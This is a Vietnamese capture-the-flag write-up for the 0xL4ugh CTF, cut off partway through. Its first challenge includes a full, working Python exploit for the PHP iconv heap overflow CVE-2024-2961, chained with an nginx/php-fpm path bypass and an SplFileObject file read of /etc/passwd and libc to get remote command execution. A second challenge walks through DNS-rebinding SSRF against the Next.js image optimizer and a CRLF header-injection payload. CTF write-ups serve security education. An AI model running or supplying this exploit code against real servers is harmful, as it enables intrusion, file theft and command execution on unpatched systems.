36.857L44 292.846v-73.714zm190 229.715L61.714 333.989l76.857-51.429L234 346.275v102.572zm22-140.858-77.715-52 77.715-52 77.715 52-77.715 52zm22 140.858V346.275l95.429-63.715 76.857 51.429L278 448.847zm190-156.001-55.143-36.857L468 219.132v73.714z"/></svg></span></div><p class="text-bg font-bg">CRYPTO</p></a></li><li class=mt-1><a href=/MSEC/for/ class="flex items-center hover:text-primary-600 dark:hover:text-primary-400" aria-label=FOR title=FORs><div class=mr-2><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M48 64C21.5 64 0 85.5.0 112c0 15.1 7.1 29.3 19.2 38.4L236.8 313.6c11.4 8.5 27 8.5 38.4.0L492.8 150.4c12.1-9.1 19.2-23.3 19.2-38.4.0-26.5-21.5-48-48-48H48zM0 176V384c0 35.3 28.7 64 64 64H448c35.3.0 64-28.7 64-64V176L294.4 339.2c-22.8 17.1-54 17.1-76.8.0L0 176z"/></svg></span></div><p class="text-bg font-bg">FOR</p></a></li><li class=mt-1><a href=/MSEC/pwn/ class="flex items-center hover:text-primary-600 dark:hover:text-primary-400" aria-label=PWN title=PWNs><div class=mr-2><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M256 8C119.252 8 8 119.252 8 256s111.252 248 248 248 248-111.252 248-248S392.748 8 256 8zm163.97 114.366c29.503 36.046 47.369 81.957 47.835 131.955-6.984-1.477-77.018-15.682-147.502-6.818-5.752-14.041-11.181-26.393-18.617-41.614 78.321-31.977 113.818-77.482 118.284-83.523zM396.421 97.87c-3.81 5.427-35.697 48.286-111.021 76.519-34.712-63.776-73.185-116.168-79.04-124.008 67.176-16.193 137.966 1.27 190.061 47.489zm-230.48-33.25c5.585 7.659 43.438 60.116 78.537 122.509-99.087 26.313-186.36 25.934-195.834 25.809C62.38 147.205 106.678 92.573 165.941 64.62zM44.17 256.323c0-2.166.043-4.322.108-6.473 9.268.19 111.92 1.513 217.706-30.146 6.064 11.868 11.857 23.915 17.174 35.949-76.599 21.575-146.194 83.527-180.531 142.306C64.794 360.405 44.17 310.73 44.17 256.323zm81.807 167.113c22.127-45.233 82.178-103.622 167.579-132.756 29.74 77.283 42.039 142.053 45.189 160.638-68.112 29.013-150.015 21.053-212.768-27.882zm248.38 8.489c-2.171-12.886-13.446-74.897-41.152-151.033 66.38-10.626 124.7 6.768 131.947 9.055-9.442 58.941-43.273 109.844-90.795 141.978z"/></svg></span></div><p class="text-bg font-bg">PWN</p></a></li><li class=mt-1><a href=/MSEC/re/ class="flex items-center hover:text-primary-600 dark:hover:text-primary-400" aria-label=RE title=REs><div class=mr-2><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M47.6 300.4 228.3 469.1c7.5 7 17.4 10.9 27.7 10.9s20.2-3.9 27.7-10.9L464.4 300.4c30.4-28.3 47.6-68 47.6-109.5v-5.8c0-69.9-50.5-129.5-119.4-141C347 36.5 300.6 51.4 268 84L256 96 244 84c-32.6-32.6-79-47.5-124.6-39.9C50.5 55.6.0 115.2.0 185.1v5.8c0 41.5 17.2 81.2 47.6 109.5z"/></svg></span></div><p class="text-bg font-bg">RE</p></a></li><li class=mt-1><a href=/MSEC/web/ class="flex items-center hover:text-primary-600 dark:hover:text-primary-400" aria-label=WEB title=WEBs><div class=mr-2><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M256 232.562c-21.183-41.196-78.868-117.97-132.503-155.834-51.378-36.272-70.978-29.987-83.828-24.181-14.872 6.72-17.577 29.554-17.577 42.988.0 13.433 7.365 110.138 12.169 126.281 15.873 53.336 72.376 71.358 124.413 65.574 2.66-.395 5.357-.759 8.089-1.097-2.68.429-5.379.796-8.089 1.097-76.259 11.294-143.984 39.085-55.158 137.972C201.224 526.527 237.424 403.67 256 341.379c18.576 62.291 39.972 180.718 150.734 83.983 83.174-83.983 22.851-126.674-53.408-137.969-2.71-.302-5.409-.667-8.089-1.096 2.732.337 5.429.702 8.089 1.096 52.037 5.785 108.54-12.239 124.413-65.574 4.804-16.142 12.169-112.847 12.169-126.281.0-13.434-2.705-36.267-17.577-42.988-12.85-5.806-32.45-12.09-83.829 24.181C334.868 114.595 277.183 191.366 256 232.562z"/></svg></span></div><p class="text-bg font-bg">WEB</p></a></li><li class=mt-1><a href class="flex items-center hover:text-primary-600 dark:hover:text-primary-400" title></a></li></ul></div></div></div></div></div></div><script type=text/javascript src=/MSEC/js/background-blur.min.00a57c73ea12f2cab2980c3c3d649e89f6d82f190f74bbe2b67f2f5e39ab7d032ece47086400ca05396758aace13299da49aca43ea643d2625e62c506267a169.js integrity="sha512-AKV8c+oS8sqymAw8PWSeifbYLxkPdLvitn8vXjmrfQMuzkcIZADKBTlnWKrOEymdpJrKQ+pkPSYl5ixQYmehaQ==" data-blur-id=menu-blur></script><div class="relative flex flex-col grow"><main id=main-content class=grow><article><header id=single_header class="mt-5 max-w-prose"><h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">OxL4ugh CTF</h1><div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden"><div class="flex flex-row flex-wrap items-center"><time datetime=0001-01-01T00:00:00+00:00>1 January 0001</time><span class="px-2 text-primary-500">&#183;</span><span>3757 words</span><span class="px-2 text-primary-500">&#183;</span><span title="Reading time">18 mins</span></div></div><div class="flex author"><div class=place-self-center><div class="text-2xl sm:text-lg"></div></div></div><div class=mb-5></div></header><section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row"><div class="min-w-0 min-h-0 max-w-fit"><div class="article-content max-w-prose mb-20"><h1 class="relative group">0xNote<div id=0xnote class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#0xnote aria-label=Anchor>#</a></span></h1><p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=image src=https://hackmd.io/_uploads/ryOk1sVIWx.png></figure></p><h2 class="relative group">Overview<div id=overview class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#overview aria-label=Anchor>#</a></span></h2><ul><li>Backend : <strong>fpm</strong><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=image src=https://hackmd.io/_uploads/SJSBJj4U-l.png></figure></li><li>Proxy : <strong>nginx</strong><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=image src=https://hackmd.io/_uploads/HkQCko4LZl.png></figure></li><li>Giao diện<figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=image src=https://hackmd.io/_uploads/SkCqlsE8be.png></figure></li><li>Tuy nhiên bị chặn ở <code>/premium.php</code></li></ul><h2 class="relative group">Solve<div id=solve class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#solve aria-label=Anchor>#</a></span></h2><ul><li>Với cách viết proxy như sau ta có thể bypass bằng việc thêm <code>index.php</code> ngay sau thư mục mà ta bị chặn (<code>premium.php</code>)<figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=image src=https://hackmd.io/_uploads/BkGVeoVI-x.png></figure></li><li><a href=https://angelica.gitbook.io/hacktricks/pentesting-web/proxy-waf-protections-bypass#php-fpm target=_blank>Cách bypass ở đây</a></li><li>Sau khi vào được <code>/premium.php</code> bằng <code>/premium.php/index.php</code> ta thấy được ứng dụng set color không fillter input người dùng</li><li>Như đoạn code sau nếu có thể kiểm soát được <code>color</code> và <code>note</code> thì có thể tạo ra 1 object mới :<figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=image src=https://hackmd.io/_uploads/rkKAWiNL-e.png></figure></li></ul><h2 class="relative group">Exploit<div id=exploit class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#exploit aria-label=Anchor>#</a></span></h2><ul><li>CHúng ta sẽ dùng SPLFileObject để đọc 1 file bất kì</li><li>Set path : <code>php://filter/convert.base64-encode/resource=/etc/passwd</code><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=image src=https://hackmd.io/_uploads/Sy_7VjNUZx.png></figure></li><li>Set Classname<figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=image src=https://hackmd.io/_uploads/H1PwVjEIWl.png></figure></li><li>Đọc kết quả<figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=image src=https://hackmd.io/_uploads/rkbq4sV8Wx.png></figure></li><li>Auket lấy được <code>etc/passwd</code> tuy nhiên flag có quyền Owner vậy nên chưa đủ quyền để đọc<figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=image src=https://hackmd.io/_uploads/rJzRNiVUZg.png></figure></li></ul><h3 class="relative group">Nâng quyền<div id=nâng-quyền class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#n%c3%a2ng-quy%e1%bb%81n aria-label=Anchor>#</a></span></h3><ul><li>Ngay khi thực hiện được <code>SPLFileObject</code> như ở trên ta cũng có thể biến thể để nâng lên từ đọc file thành RCE từ <a href=https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py target=_blank>đoạn tài liệu sau</a> và <a href=https://blog.lexfo.fr/iconv-cve-2024-2961-p1.html target=_blank>cái này</a><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=image src=https://hackmd.io/_uploads/SJfsHsVIZl.png></figure></li><li>Sau đây sẽ là PWN CORE , mình đéo biết giải thích như nào nên chạy code thôi ; Vào <code>http://localhost:5000/</code> để check id</li></ul><pre tabindex=0><code class="language-php=" data-lang="php=">import requests
from pwn import *
import re
import base64
import zlib
from bs4 import BeautifulSoup

session = requests.Session()

## Constant

HEAP_SIZE = 2 * 1024 * 1024
BUG = &#34;劄&#34;.encode(&#34;utf-8&#34;)

## Post init function

def get_file(url, path):
    path = f&#34;php://filter/convert.base64-encode/resource={path}&#34;
    r = session.post(url + &#39;login.php&#39;, data={&#39;username&#39;:&#39;winky&#39;})
    r = session.post(url + &#39;index.php&#39;, data={&#39;note&#39;:path})
    r = session.post(url + &#39;/premium.php/index.php&#39;, data={&#39;color&#39;: &#39;SplFileObject&#39;})
    r = session.get(url + &#39;index.php&#39;)
    soup = BeautifulSoup(r.text, &#34;html.parser&#34;)
    data = soup.find(&#34;div&#34;, id=&#34;noteContent&#34;).get_text(strip=True)
    return base64.b64decode(data)

def compress(data):
    return zlib.compress(data, 9)[2:-4]

def compressed_bucket(data):
    return chunked_chunk(data, 0x8000)

def qpe(data):
    return &#34;&#34;.join(f&#34;={x:02x}&#34; for x in data).upper().encode()

def ptr_bucket(*ptrs, size=None):
    if size is not None:
        assert len(ptrs) * 8 == size
    bucket = b&#34;&#34;.join(map(p64, ptrs))
    bucket = qpe(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = compressed_bucket(bucket)
    return bucket

def chunked_chunk(data, size: int = None):
    if size is None:
        size = len(data) + 8
    keep = len(data) + len(b&#34;\n\n&#34;)
    size = f&#34;{len(data):x}&#34;.rjust(size - keep, &#34;0&#34;)
    return size.encode() + b&#34;\n&#34; + data + b&#34;\n&#34;

## Pwn core

class PWN_Core():
    def __init__(self, url, command) -&gt; None:
        self.url = url
        self.command = command
        self.info = {}
        self.heap = None
        self.pad = 20
        
    class Region():
        def __init__(self, start, stop, permissions, path):
            self.start = int(start)
            self.stop = int(stop)
            self.permissions = permissions
            self.path = path
        
        @property
        def size(self) -&gt; int:
            return self.stop - self.start
    
    def download_file(self, remote_path: str, local_path: str) -&gt; None:
        data = get_file(self.url, remote_path)
        Path(local_path).write_bytes(data)
    
    def get_regions(self):
        maps = get_file(self.url, &#34;/proc/self/maps&#34;)
        maps = maps.decode()
        PATTERN = re.compile(
            r&#34;^([a-f0-9]+)-([a-f0-9]+)\b&#34; r&#34;.*&#34; r&#34;\s([-rwx]{3}[ps])\s&#34; r&#34;(.*)&#34;
        )
        regions = []
        for region in [line.strip() for line in maps.strip().split(&#39;\n&#39;)]:
            if match := PATTERN.match(region):
                start = int(match.group(1), 16)
                stop = int(match.group(2), 16)
                permissions = match.group(3)
                path = match.group(4)
                if &#34;/&#34; in path or &#34;[&#34; in path:
                    path = path.rsplit(&#34; &#34;, 1)[-1]
                else:
                    path = &#34;&#34;
                current = self.Region(start, stop, permissions, path)
                regions.append(current)
                
            else:
                print(maps)
        return regions

    def _get_region(self, regions: list[Region], *names: str) -&gt; Region:
        for region in regions:
            if any(name in region.path for name in names):
                break
        return region

    def find_main_heap(self, regions):
        heaps = [
            region.stop - HEAP_SIZE + 0x40
            for region in reversed(regions)
            if region.permissions == &#34;rw-p&#34;
            and region.size &gt;= HEAP_SIZE
            and region.stop &amp; (HEAP_SIZE-1) == 0
            and region.path in (&#34;&#34;, &#34;[anon:zend_alloc]&#34;)
        ]
        first = heaps[0]
        if len(heaps) &gt; 1:
            heaps = &#34;, &#34;.join(map(hex, heaps))
        return first

    def get_symbols_and_addresses(self) -&gt; None:
        regions = self.get_regions()
        LIBC_FILE = &#34;./libc&#34;
        self.info[&#34;heap&#34;] = self.find_main_heap(regions)
        libc = self._get_region(regions, &#34;libc-&#34;, &#34;libc.so&#34;)
        self.download_file(libc.path, LIBC_FILE)
        self.info[&#34;libc&#34;] = ELF(LIBC_FILE, checksec=False)
        self.info[&#34;libc&#34;].address = libc.start

    def build_exploit_path(self):
        
        self.get_symbols_and_addresses()
        
        LIBC = self.info[&#34;libc&#34;]
        ADDR_EMALLOC = LIBC.symbols[&#34;__libc_malloc&#34;]
        ADDR_EFREE = LIBC.symbols[&#34;__libc_system&#34;]
        ADDR_EREALLOC = LIBC.symbols[&#34;__libc_realloc&#34;]
        ADDR_HEAP = self.info[&#34;heap&#34;]
        ADDR_FREE_SLOT = ADDR_HEAP + 0x20
        ADDR_CUSTOM_HEAP = ADDR_HEAP + 0x0168
        ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10
        CS = 0x100

        pad_size = CS - 0x18
        pad = b&#34;\x00&#34; * pad_size
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = compressed_bucket(pad)

        step1_size = 1
        step1 = b&#34;\x00&#34; * step1_size
        step1 = chunked_chunk(step1)
        step1 = chunked_chunk(step1)
        step1 = chunked_chunk(step1, CS)
        step1 = compressed_bucket(step1)
        
        step2_size = 0x48
        step2 = b&#34;\x00&#34; * (step2_size + 8)
        step2 = chunked_chunk(step2, CS)
        step2 = chunked_chunk(step2)
        step2 = compressed_bucket(step2)

        step2_write_ptr = b&#34;0\n&#34;.ljust(step2_size, b&#34;\x00&#34;) + p64(ADDR_FAKE_BIN)
        step2_write_ptr = chunked_chunk(step2_write_ptr, CS)
        step2_write_ptr = chunked_chunk(step2_write_ptr)
        step2_write_ptr = compressed_bucket(step2_write_ptr)

        step3_size = CS
        step3 = b&#34;\x00&#34; * step3_size
        assert len(step3) == CS
        step3 = chunked_chunk(step3)
        step3 = chunked_chunk(step3)
        step3 = chunked_chunk(step3)
        step3 = compressed_bucket(step3)

        step3_overflow = b&#34;\x00&#34; * (step3_size - len(BUG)) + BUG
        assert len(step3_overflow) == CS
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = compressed_bucket(step3_overflow)

        step4_size = CS
        step4 = b&#34;=00&#34; + b&#34;\x00&#34; * (step4_size - 1)
        step4 = chunked_chunk(step4)
        step4 = chunked_chunk(step4)
        step4 = chunked_chunk(step4)
        step4 = compressed_bucket(step4)
        
        step4_pwn = ptr_bucket(
            0x200000,
            0,
            # free_slot
            0,
            0,
            ADDR_CUSTOM_HEAP,  # 0x18
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            ADDR_HEAP,  # 0x140
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            size=CS,
        )

        step4_custom_heap = ptr_bucket(
            ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18
        )
        
        step4_use_custom_heap_size = 0x140
        
        COMMAND = self.command
        COMMAND = f&#34;kill -9 $PPID; {COMMAND}&#34;
        COMMAND = COMMAND.encode() + b&#34;\x00&#34;

        COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b&#34;\x00&#34;)

        step4_use_custom_heap = COMMAND
        step4_use_custom_heap = qpe(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)
        
        pages = (
            step4 * 3
            + step4_pwn
            + step4_custom_heap
            + step4_use_custom_heap
            + step3_overflow
            + pad * self.pad
            + step1 * 3
            + step2_write_ptr
            + step2 * 2
        )
        
        resource = compress(compress(pages))
        resource = base64.b64encode(resource).decode()
        resource = f&#34;data:text/plain;base64,{resource}&#34;
        
        filters = [
            # Create buckets
            &#34;zlib.inflate&#34;,
            &#34;zlib.inflate&#34;,
            
            # Step 0: Setup heap
            &#34;dechunk&#34;,
            &#34;convert.iconv.L1.L1&#34;,
            
            # Step 1: Reverse FL order
            &#34;dechunk&#34;,
            &#34;convert.iconv.L1.L1&#34;,
            
            # Step 2: Put fake pointer and make FL order back to normal
            &#34;dechunk&#34;,
            &#34;convert.iconv.L1.L1&#34;,
            
            # Step 3: Trigger overflow
            &#34;dechunk&#34;,
            &#34;convert.iconv.UTF-8.ISO-2022-CN-EXT&#34;,
            
            # Step 4: Allocate at arbitrary address and change zend_mm_heap
            &#34;convert.quoted-printable-decode&#34;,
            &#34;convert.iconv.L1.L1&#34;,
        ]
        filters = &#34;|&#34;.join(filters)
        path = f&#34;php://filter/read={filters}/resource={resource}&#34;
        return path

def solve():
    URL = &#39;http://localhost:5000/&#39;
    
    command = &#39;id &gt; /tmp/check_id&#39;
    
    print(f&#39;[+] Build payload với lệnh: {command}&#39;)
    path = PWN_Core(URL, command).build_exploit_path()
    
    # 2. Gửi Exploit (Chấp nhận lỗi 502/Server Crash)
    try:
        print(&#39;[*] Đang gửi payload kích hoạt RCE...&#39;)
        # Bước này server có thể trả về 502 do tiến trình crash, ta dùng try/except để bỏ qua lỗi
        # Lưu ý: Không gọi get_file ở đây để đọc kết quả ngay, vì hàm get_file sẽ fail khi parse HTML lỗi
        
        # Tự gửi request thủ công để tránh logic parse HTML của hàm get_file
        exploit_payload = f&#34;php://filter/convert.base64-encode/resource={path}&#34;
        session.post(URL + &#39;login.php&#39;, data={&#39;username&#39;:&#39;winky&#39;})
        session.post(URL + &#39;index.php&#39;, data={&#39;note&#39;: exploit_payload})
        session.post(URL + &#39;/premium.php/index.php&#39;, data={&#39;color&#39;: &#39;SplFileObject&#39;})
        session.get(URL + &#39;index.php&#39;, timeout=5) # Kích hoạt exploit
        
    except Exception as e:
        # Lỗi 502 hoặc timeout là dấu hiệu tốt (server đang xử lý/crash do exploit)
        print(f&#39;[!] Server phản hồi/crash (điều này là bình thường với CVE-2024-2961): {e}&#39;)
    
    # 3. Đợi hệ thống đồng bộ file
    import time
    print(&#39;[*] Đợi 2 giây để lệnh thực thi xong...&#39;)
    time.sleep(2)
    
    # 4. Đọc kết quả từ file /tmp/check_id bằng LFI (Sử dụng lại hàm get_file)
    print(&#39;[*] Đang đọc kết quả từ /tmp/check_id...&#39;)
    try:
        # Dùng chính tính năng SplFileObject để đọc file kết quả
        result = get_file(URL, &#34;/tmp/check_id&#34;)
        
        if result:
            print(&#39;\n[+] KẾT QUẢ COMMAND ID:&#39;)
            print(&#39;=&#39;*40)
            print(result.decode(&#39;utf-8&#39;).strip())
            print(&#39;=&#39;*40)
        else:
            print(&#39;[-] Không đọc được kết quả. Có thể exploit chưa thành công.&#39;)
            
    except Exception as e:
        print(f&#39;[-] Lỗi khi đọc file kết quả: {e}&#39;)

if __name__ == &#34;__main__&#34;:
    solve()
</code></pre><p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=image src=https://hackmd.io/_uploads/SyU18T4I-g.png></figure></p><ul><li>Bây giờ để lấy flag cần sử dụng binary <code>/readflag</code>. Trong Dockerfile binary này đã được cấp quyền <code>SUID</code> tức là khi user <code>nobody</code> chạy nó, nó sẽ thực thi với quyền của chủ sở hữu file (là root)</li></ul><pre tabindex=0><code class="language-php=" data-lang="php=">def solve():
    URL = &#39;http://localhost:5000/&#39;
    
    # Output được ghi vào /tmp/flag_result để user nobody có thể đọc lại sau đó
    command = &#39;/readflag &gt; /tmp/flag_result&#39;
    
    print(f&#39;[+] Đang tạo payload cho lệnh: {command}&#39;)
    
    path = PWN_Core(URL, command).build_exploit_path()
    
    # 1. Gửi Exploit (Trigger RCE)
    try:
        print(&#39;[*] Đang gửi payload kích hoạt RCE...&#39;)
        # Gửi request để kích hoạt lỗi iconv, server dự kiến sẽ crash (trả về 502)
        encoded_path = f&#34;php://filter/convert.base64-encode/resource={path}&#34;
        session.post(URL + &#39;login.php&#39;, data={&#39;username&#39;:&#39;winky&#39;})
        session.post(URL + &#39;index.php&#39;, data={&#39;note&#39;: encoded_path})
        session.post(URL + &#39;/premium.php/index.php&#39;, data={&#39;color&#39;: &#39;SplFileObject&#39;})
        session.get(URL + &#39;index.php&#39;, timeout=5)
    except Exception as e:
        print(f&#39;[!] Server đã crash/phản hồi (Dấu hiệu tốt): {e}&#39;)
    
    # 2. Đợi hệ thống xử lý
    import time
    print(&#39;[*] Đợi 2 giây để lệnh /readflag thực thi xong...&#39;)
    time.sleep(2)
    
    # 3. Đọc kết quả từ file tạm bằng kỹ thuật LFI cũ
    print(&#39;[*] Đang đọc flag từ /tmp/flag_result...&#39;)
    try:
        # Sử dụng lại hàm get_file (SplFileObject) để đọc file kết quả
        flag = get_file(URL, &#34;/tmp/flag_result&#34;)
        
        if flag:
            print(&#39;\n&#39; + &#39;=&#39;*40)
            print(f&#34;FLAG: {flag.decode(&#39;utf-8&#39;, errors=&#39;ignore&#39;).strip()}&#34;)
            print(&#39;=&#39;*40 + &#39;\n&#39;)
        else:
            print(&#39;[-] Không đọc được flag. Có thể exploit thất bại hoặc file không tồn tại.&#39;)
            
    except Exception as e:
        print(f&#39;[-] Lỗi khi đọc file flag: {e}&#39;)

if __name__ == &#34;__main__&#34;:
    solve()
</code></pre><p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=image src=https://hackmd.io/_uploads/Sk4YUaELbg.png></figure></p><p><strong>Flag: 0xL4ugh{1think_y0u_l0ved_my_pHp_n0te_e1bfd312v_dc754541a1d6a4fd}</strong></p><h1 class="relative group">pdf.exe<div id=pdfexe class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#pdfexe aria-label=Anchor>#</a></span></h1><p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=image src=https://hackmd.io/_uploads/Sy8Srer8-e.png></figure></p><h2 class="relative group">Overview<div id=overview-1 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#overview-1 aria-label=Anchor>#</a></span></h2><ul><li><strong>DNS Rebinding SSRF</strong> in Next.js Image Optimizer để chạm tới dịch vụ nội bộ</li><li><strong>CRLF Injection</strong> in Python&rsquo;s <code>urllib.request</code> <code>data:</code> URI handler để chèn header độc hại vào gói tin</li><li><strong>pdfkit Argument Injection</strong> via <strong>injected HTML meta tags</strong> để lấy được nội dung của flag từ dịch vụ nội bộ</li></ul><h2 class="relative group">Next.js Image Optimizer SSRF<div id=nextjs-image-optimizer-ssrf class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#nextjs-image-optimizer-ssrf aria-label=Anchor>#</a></span></h2><ul><li><p>Trước tiên ta sẽ gặp được cấu hình file <code>next.config.ts</code> như sau :<figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=image src=https://hackmd.io/_uploads/r1IpmXdU-g.png></figure>=> Willcard <code>hostname: "**"</code> cho phép tối ưu hình ảnh từ việc lấy ảnh từ bất kì host <code>HTTP</code> nào
=> Đối với endpoint <code>/_next/image</code> nếu kiểm soát được <code>url</code> ta có thể <strong>SSRF</strong> vào dịch vụ nội bộ</p></li><li><p>Đối với endpoint <code>/_next/image</code> chấp nhạn 3 tham số</p></li></ul><table><thead><tr><th>Tham số</th><th>Chức năng</th></tr></thead><tbody><tr><td>url</td><td>Url của ảnh và tối ưu</td></tr><tr><td>w</td><td>Chiều rộng mong muốn</td></tr><tr><td>q</td><td>Số lượng</td></tr></tbody></table><ul><li><p>Request sẽ như sau : <code>GET /_next/image?url=https://example.com/photo.jpg&amp;w=640&amp;q=75</code></p></li><li><p>Thực hiện SSRF cổ điển như sau <code>GET /_next/image?url=http://127.0.0.1:5000/generate&amp;w=640&amp;q=75</code> nhưng đương nhiên sẽ bị chặn</p></li><li><p>Giờ đến lúc đâm sâu vào src với <a href=https://github.com/vercel/next.js/blob/canary/packages/next/src/server/image-optimizer.ts target=_blank>hàm <code>fetchExternalImage</code></a></p></li><li><p>Hàm này sẽ có chức năng như sau :</p><ul><li>Parse hostname từ ip</li><li>Resolve DNS để chuyển về ip</li><li>Kiểm tra xem có phải ip nội bộ không</li><li>Nếu là IP nội bộ thì chặn</li><li>Còn nếu không thì cho qua</li></ul></li><li><p>Auke đây sẽ là lúc Time-of-Check to Time-of-Use <strong>(TOCTOU)</strong></p></li><li><p>Thời gian server kiểm tra ip riêng sẽ là lúc ta thực hiện request đến mục tiêu</p></li><li><p>Sử dụng cái này để <a href=https://lock.cmpxchg8b.com/rebinder.html target=_blank>DNS rebinding</a></p></li><li><p>You control a domain</p></li><li><p>The DNS server is configured with a very low TTL and alternates responses:</p><ul><li>First query -> 1.2.3.4 (public IP, passes validation)</li><li>Second query -> 127.0.0.1 (private IP, actual target)</li></ul></li><li><p>Image optimizer:</p><ul><li>Resolves evil.mushroom.cat -> 1.2.3.4 ✅ (validation passes)</li><li>Calls fetch(evil.mushroom.cat) -> DNS resolves again -> 127.0.0.1 Request hits localhost! ✅✅✅✅</li></ul></li><li><p>URl sẽ như sau <code>GET /_next/image?url=http://7f000001.8efab5ae.rbndr.us:5000/generate?data=...&amp;w=640&amp;q=75</code><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=image src=https://hackmd.io/_uploads/SJpe1LdLZl.png></figure></p></li></ul><h2 class="relative group">Python urllib CRLF Injection in (<code>data:</code>) URIs<div id=python-urllib-crlf-injection-in-data-uris class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#python-urllib-crlf-injection-in-data-uris aria-label=Anchor>#</a></span></h2><ul><li><p>Như ta thấy dataURI được ta kiểm soát hoàn toàn và nó chỉ fillter đơn giản bới <code>data_uri.startswith("data:plain/text"):</code> kiểm tra xem có bắt đầu chuỗi bằng <code>data:plain/text</code> không .<figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=image src=https://hackmd.io/_uploads/rySheLdIbe.png></figure></p></li><li><p>Ngay sau đó <code>datauri</code> sẽ rơi vào <code>urlopen</code> và <code>Python's urllib.request</code> sẽ xứ lí <code>data: URIs</code> through the <code>DataHandler class</code>.<figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=image src=https://hackmd.io/_uploads/HJ-VbLd8bg.png></figure></p></li><li><p><code>Data:</code> URI sẽ có dạng <code>data:[&lt;mediatype>][;base64],&lt;data></code></p></li><li><p>Hàm <code>email.message_from_string()</code> xử lí headers. Headers được tách bới newline (<code>\r\n</code> or <code>\n</code>). Vậy nên ta chèn (<code>%0A</code>) vào phần mediatype</p></li></ul><pre tabindex=0><code class="language-code=" data-lang="code=">data:plain/text%0AContent-Disposition: malicious-header,mushroom

    ||
    ||
    \/
Content-Type: plain/text
Content-Disposition: malicious-header
